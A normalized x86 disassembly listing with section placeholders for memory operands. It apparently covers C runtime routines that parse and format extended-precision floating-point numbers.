jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41e4e3
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
cmp [ ebp + 0x24 ] ebx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_41eb77 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
mov [ ebp - 0x58 ] esi
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
cmp al 0x9
mov [ ebp - 0x5c ] esi
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_4202d1
mov eax [ ebp - 0x64 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x68 ] ecx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov esi rw-data
sub esi 0x60
cmp eax ecx
mov [ ebp - 0x54 ] eax
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] ecx
jne r-xdata
neg eax
mov esi rw-data
mov [ ebp - 0x54 ] eax
sub esi 0x60
cmp [ ebp - 0x54 ] ecx
je r-xdata
mov [ ebp - 0x3c ] cx
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add esi 0x54
and eax 0x7
test eax eax
mov [ ebp - 0x4c ] esi
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax esi
mov ebx eax
cmp [ ebx ] 0x8000
mov [ ebp - 0x70 ] ebx
jb r-xdata
movzx edx [ ebx + 0xa ]
mov ecx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax edx
mov edi 0x7fff
xor eax ecx
and ecx edi
and edx edi
and eax 0x8000
cmp cx 0x7fff
lea edi [ edx + ecx ]
movzx edi di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov esi [ ebp - 0x4c ]
lea ebx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ebx
neg ax
sbb eax eax
and [ ebp - 0x38 ] 0x0
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp dx 0x7fff
jae r-xdata
cmp di 0xbffd
ja r-xdata
cmp di 0x3fbf
ja r-xdata
test cx cx
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
xor ecx ecx
cmp dx cx
jne r-xdata
inc edi
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
and [ ebp - 0x68 ] ecx
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
inc esi
inc esi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x3c ]
add ebx 0x8
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ebx
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add ecx ecx
test edx edx
mov [ ebp - 0x64 ] edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x78 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebx ] ecx
jne r-xdata
and [ ebp - 0x32 ] cx
jmp r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x24 ] 0x80000000
jne r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x78 ] 0x0
mov [ esi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8000
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x24 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
test di di
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x78 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
mov ebx [ ebp - 0x70 ]
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x2c ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
cmp di 0x7fff
mov esi [ ebp - 0x4c ]
jae r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov cx [ ebp - 0x2a ]
mov [ ebp - 0x3c ] cx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x3a ] ecx
mov ecx [ ebp - 0x24 ]
or edi eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] di
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffff
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] 0x8000
inc edi
jmp r-xdata
sub_41eba7
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
test cx cx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x6c ] ecx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx 0x7fff
jne r-xdata
test esi esi
jne r-xdata
test dx dx
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx ecx ax
movsx ebx cx
mov [ ebp - 0x4c ] ecx
xor eax eax
mov ecx rw-data
neg ebx
sub ecx 0x60
cmp ebx eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x68 ] ecx
je r-xdata
mov eax 0x80000000
cmp esi eax
mov [ ebx ] 0x1
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
cmp cx 0x3fff
mov ebx 0x7fff
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] di
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ edx ] cx
je r-xdata
mov esi [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
movzx edx cx
mov ecx esi
xor ecx edx
and edx ebx
and esi ebx
and ecx 0x8000
cmp dx bx
lea edi [ esi + edx ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
movzx edi di
jae r-xdata
cmp ebx eax
je r-xdata
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x68 ] ecx
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
push 0x15
pop ecx
cmp [ ebp + 0x14 ] ecx
jle r-xdata
movsx ecx cx
add [ ebp + 0x14 ] ecx
cmp [ ebp + 0x14 ] eax
jg r-xdata
neg cx
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
cmp si bx
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_410677
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
push 0x8
sub esi 0x3ffe
mov [ ebp - 0x16 ] ax
pop ebx
mov [ ebp + 0x14 ] ecx
and [ edx ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
cmp di 0xbffd
ja r-xdata
test ebx ebx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x8000
mov [ ebp - 0x64 ] ecx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add edi edi
or edi eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp di 0x3fbf
ja r-xdata
xor eax eax
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x16 ]
xor eax eax
mov ecx edi
mov esi 0x7fff
xor ecx edx
and edx esi
and edi esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
and ecx 0x8000
cmp dx si
lea eax [ edi + edx ]
movzx eax ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x64 ] eax
mov ecx eax
push r--data
push r--data
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc eax
test eax eax
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
cmp dx ax
jne r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
neg cx
sbb ecx ecx
and [ ebp - 0x1c ] 0x0
and ecx 0x80000000
add ecx 0x7fff8000
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x18 ] ecx
cmp di si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_410677
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
test esi esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
jg r-xdata
cmp si ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
cmp ax 0xbffd
ja r-xdata
xor eax eax
